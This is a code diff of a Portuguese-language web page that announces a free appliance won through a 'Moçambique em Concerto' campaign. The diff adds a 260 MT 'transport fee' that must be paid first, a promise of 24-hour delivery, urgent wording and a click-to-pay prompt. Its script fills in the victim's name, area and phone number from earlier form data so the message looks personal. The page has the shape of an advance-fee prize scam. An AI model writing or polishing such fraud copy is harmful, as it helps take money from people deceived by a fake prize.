@@ -131,15 +131,17 @@
       <div class="mensagem">
         <p>Foste seleccionado pela campanha <strong>Moçambique em Concerto</strong> para receber <strong>um Electrodoméstico Gratuito</strong> (imagem acima), como parte da nossa distribuição nacional.</p>
 
-        <p>A nossa equipa da <strong>TV Sucesso</strong> irá entrar em contacto contigo através do número: <strong><span id="contactoClienteSpan"></span></strong>, para confirmar a entrega na tua localização: <strong><span id="zonaClienteSpan"></span></strong>.</p>
+        <p>A nossa equipa da <strong>TV Sucesso</strong> irá contactar-te através do número <strong><span id="contactoClienteSpan"></span></strong> para confirmar o melhor dia para entrega na tua localização: <strong><span id="zonaClienteSpan"></span></strong>.</p>
 
-        <p>O teu produto será enviado por transportadora, acompanhado pela nossa equipa.</p>
+        <p><strong>A entrega será feita no prazo de até 24 horas</strong> após o pagamento da taxa. Mas antes de enviarmos, iremos ligar para confirmar se podes receber nesse dia. Por isso, mantém o teu telefone ligado.</p>
 
-        <p><strong>A entrega será feita em até <span style="color:#33ff66;">24 horas</span>.</strong></p>
+        <p><strong>Agora depende apenas de ti</strong> para confirmar a encomenda e garantir o envio.</p>
 
-        <p>Agora depende apenas de ti.</p>
+        <p>Para isso, é necessário pagar a <strong style="color:#33ff66;">taxa única de transporte no valor de 260 MT</strong>, que serve para cobrir os custos da entrega até à tua localização.</p>
 
-        <p>Para garantirmos a entrega, a encomenda será processada assim que for paga a <strong style="color:#33ff66;">taxa única de transporte</strong> referente à entrega.</p>
+        <p>Assim que recebermos a confirmação do pagamento, daremos seguimento imediato ao envio.</p>
+
+        <p><strong>Clica no botão abaixo para continuar.</strong></p>
       </div>
 
       <div class="aviso">
@@ -154,13 +156,11 @@
   </div>
 
   <script>
-    // Recuperar dados
     const nome = localStorage.getItem('nomeCliente') || "Cliente";
     const zona = localStorage.getItem('zonaCliente') || "Zona não definida";
     const contacto = localStorage.getItem('contactoCliente') || "Sem contacto";
     const resposta = localStorage.getItem('resposta3') || "";
 
-    // Mapear imagem ao produto
     const imgMap = {
       "Geleira": "img/geleira.jpg",
       "Congelador": "img/congelador.jpg",
@@ -168,14 +168,12 @@
     };
     const imgSrc = imgMap[resposta] || "img/premio.jpg";
 
-    // Preencher conteúdo dinâmico
     document.getElementById('imgPremio').src = imgSrc;
     document.getElementById('nomeClienteSpan').textContent = nome;
     document.getElementById('nomeClienteSpan2').textContent = nome;
     document.getElementById('zonaClienteSpan').textContent = zona;
     document.getElementById('contactoClienteSpan').textContent = contacto;
 
-    // Mostrar resultado com scroll suave
     setTimeout(() => {
       document.querySelector('.processando').style.display = 'none';
       const resultado = document.getElementById('resultado');
